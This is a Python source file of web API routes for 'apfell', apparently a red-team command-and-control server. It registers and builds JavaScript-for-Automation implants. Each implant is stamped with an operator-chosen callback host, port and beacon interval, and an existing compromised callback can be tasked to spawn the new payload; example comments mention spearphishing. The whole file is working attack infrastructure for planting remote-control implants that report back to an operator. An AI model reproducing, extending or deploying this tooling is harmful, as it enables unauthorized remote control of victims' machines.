from app import apfell, db_objects
from sanic.response import json, text
from app.database_models.model import Operator, Payload, Callback
from app.api.task_api import add_task_to_callback_func
import pathlib
import base64


# ---------------- PAYLOADS --------------------
@apfell.route("/api/v1.0/payloads/", methods=['GET'])
async def get_all_payloads(request):
    payloads = await db_objects.execute(Payload.select())
    return json([p.to_json() for p in payloads])


@apfell.route("/api/v1.0/payloads/register/", methods=['POST'])
async def register_payload(request):
    data = request.json
    return await json(register_payload_func(data))


# we need to register a payload so we can track it
# {"tag":"spearphish","operator":"alice","payload_type":"apfell-jxa",
#  "callback_host":"192.168.0.119","callback_port":443,"callback_interval":10,
#  "obfuscation":False, "use_ssl":True, "location": "/home/test/test.js"}
# returns either error or uuid
async def register_payload_func(data):
    if 'operator' not in data:
        return {'status': 'error', 'error': '"operator" field is required'}
    if 'payload_type' not in data:
        return {'status': 'error', 'error': '"payload_type" field is required'}
    if 'callback_host' not in data:
        return {'status': 'error', 'error': '"callback_host" field is required'}
    if 'callback_port' not in data:
        return {'status': 'error', 'error': '"callback_port" field is required'}
    if 'callback_interval' not in data:
        return {'status': 'error', 'error': '"callback_interval" field is required'}
    if 'obfuscation' not in data:
        return {'status': 'error', 'error': '"obfuscation" field is required'}
    try:
        operator = await db_objects.get(Operator, username=data['operator'])
    except Exception as e:
        print(e)
        return {'status': 'error', 'error': '"operator" ' + data['operator'] + ' does not exist'}
    pcallback = None
    if 'pcallback' in data:
        try:
            pcallback = await db_objects.get(Callback, id=data['pcallback'])
        except Exception as e:
            return {'status': 'error', 'error': 'failed to find parent callback'}
    if data['payload_type'] != "apfell-jxa":
        # update this in the future to check all possible payload types, but this is the only one for now
        return {'status': 'error', 'error': 'invalid payload type specified'}
    try:
        tag = data['tag'] if 'tag' in data else ""
        location = data['location'] if 'location' in data else "./payloads/operations/default/"
        # parent will be the ID of the parent callback if it exists
        payload = await db_objects.create(Payload, operator=operator, payload_type=data['payload_type'],
                                          tag=tag, pcallback=pcallback, callback_host=data['callback_host'],
                                          callback_port=data['callback_port'],
                                          callback_interval=data['callback_interval'],
                                          obfuscation=data['obfuscation'],
                                          use_ssl=data['use_ssl'], location=location)
    except Exception as e:
        print(e)
        return {'status': 'error', 'error': 'failed to register payload'}
    try:
        uuid = await payload.create_uuid(str(payload.tag) + str(payload.operator.username) +
                                         str(payload.location) + str(payload.payload_type) +
                                         str(payload.callback_host) + str(payload.callback_port) +
                                         str(payload.callback_interval) + str(payload.obfuscation) +
                                         str(payload.use_ssl))
        payload.uuid = uuid
        await db_objects.update(payload)
        return {'status': 'success',
                'uuid': uuid}
    except Exception as e:
        print(e)
        if "duplicate key value violates unique constraint" in str(e):
            # we just tried to duplicate a payload, remove it and return success
            await db_objects.delete(payload)
            return {'status': 'success',
                    'uuid': uuid}
        # if this wasn't the case, then we actually do want to throw an error
        return {'status': 'error',
                     'error': 'failed to create payload uuid'}


@apfell.route("/api/v1.0/payloads/create-jxa", methods=['POST'])
async def create_jxa_payload(request):
    data = request.json
    #print(data)
    # create a new apfell-jxa payload and return the content base64 encoded
    # configuration parameters are passed in
    #   if task=True then take the created payload and task the specified callback
    #     with the specified method
    # {'callback_host':'ip/domain', 'callback_port':portnumber, 'obfuscation':true/false,
    #  'callback_interval':5, 'tag':'something', 'pcallback':id_num_of_callback,
    #  'task':True, 'operator':'alice', 'command':'spawn shell_api oneliner', 'use_ssl':True }
    # ----------------- or we can base this off another payload -------------------
    # {'payload':uuid, 'tag':'something', 'pcallback':id_num_of_callback,
    #  'task':True, 'operator':'alice', 'command':'spawn shell_api oneliner'}
    # default tag will indicate where this payload comes from
    # default payload located in ./payloads/JXA.js
    # need to register the payload as well so we can track at checkin
    if 'payload' in data:
        # we need to pull data out of this payload instance to make our new instance
        try:
            old_payload = await db_objects.get(Payload, uuid=data['payload'])
            data['callback_host'] = old_payload.callback_host
            data['callback_port'] = old_payload.callback_port
            data['obfuscation'] = old_payload.obfuscation
            data['callback_interval'] = old_payload.callback_interval
            data['use_ssl'] = old_payload.use_ssl
            data['payload_type'] = old_payload.payload_type
            data['location'] = old_payload.location
            if 'tag' not in data:
                data['tag'] = old_payload.tag
            # all of the other fields should carry over just fine
        except Exception as e:
            return json({'status': 'error', 'error': 'failed to find old payload'})
    if 'tag' not in data:
        if data['task']:
            if data['pcallback']:
                data['tag'] = data['operator'] + " using " + data['command'] + " from " + data['pcallback']
        else:
            data['tag'] = "created jxa-payload by " + data['operator']

    rsp = await register_payload_func(data)
    if rsp['status'] == "success":
        # now that we've registered the payload in the database, we need to create it
        base_jxa = open('./payloads/JXA.js', 'r')
        # put all auto-generated payloads in their corresponding operations folders
        pathlib.Path('./payloads/operations/default').mkdir(parents=True, exist_ok=True)
        path = './payloads/operations/default/' + rsp['uuid'] + '.js'
        custom_jxa = open(path, 'w')
        http = "https" if data['use_ssl'] else "http"
        for line in base_jxa:
            if "C2 = new RestC2(10" in line:
                custom_jxa.write("C2 = new RestC2(" + str(data['callback_interval']) + ", \"" + http + "://" +
                                 data['callback_host'] + ":" + str(data['callback_port']) + "/\");")
            elif 'this.uuid = "XXXX";' in line:
                custom_jxa.write('this.uuid = "' + rsp['uuid'] + '";')
            else:
                custom_jxa.write(line)
        base_jxa.close()
        custom_jxa.close()
        # now that this payload actually exists, we need to update the database with this data
        payload = await db_objects.get(Payload, uuid=rsp['uuid'])
        payload.location = str(pathlib.Path(path).resolve())
        await db_objects.update(payload)
        # if we are doing this as a task, we need to submit the tasking
        if data['task']:
            # the params tell the implant to get a specific payload and what type it is
            task = {'command': data['command'], 'params': data['params'] + ' apfell-jxa ' + str(rsp['uuid'])}
            await add_task_to_callback_func(task, data['pcallback'], data['operator'])
        return json({'status': 'success'})
    else:
        return json({'status': 'error', 'error': rsp['error']})


@apfell.route("/api/v1.0/payloads/get/<pload:string>", methods=['GET'])
async def get_payload(request, pload):
    # return a blob of the requested payload
    # the pload string will be the uuid of a payload registered in the system
    try:
        payload = await db_objects.get(Payload, uuid=pload)
    except Exception as e:
        return json({'status': 'error', 'error': 'payload not found'})
    try:
        print(payload.location)
        with open(payload.location, 'r') as f:
            base_data = f.read()
        # b64_data = str(base64.b64encode(str.encode(base_data)))
    except Exception as e:
        print(e)
        return json({'status': 'error', 'error': 'failed to open payload'})
    return text(base_data)  # just return raw data
